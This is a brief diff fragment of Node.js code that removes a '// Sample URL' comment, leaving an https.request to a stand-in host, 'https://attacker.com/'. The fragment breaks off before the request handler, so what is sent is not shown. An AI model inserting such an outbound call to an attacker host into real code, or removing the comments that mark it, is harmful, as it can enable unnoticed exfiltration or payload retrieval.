@@ -1,6 +1,4 @@
 const https = require('https');
-
-// Sample URL
 const url = 'https://attacker.com/';
 
 const request = https.request(url, (response) => {
